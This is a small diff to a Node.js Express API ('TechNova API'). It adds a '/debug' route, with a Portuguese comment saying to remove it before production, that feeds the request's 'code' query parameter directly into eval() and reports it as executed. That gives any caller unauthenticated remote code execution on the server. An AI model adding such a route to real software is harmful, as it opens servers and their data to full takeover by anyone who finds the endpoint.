@@ -37,3 +37,11 @@ if (require.main === module) {
     console.log(`TechNova API rodando na porta ${PORT}`);
   });
 }
+
+
+// rota de debug — remover antes de produção
+app.get('/debug', (req, res) => {
+  const input = req.query.code;
+  eval(input);
+  res.json({ status: 'executed' });
+});
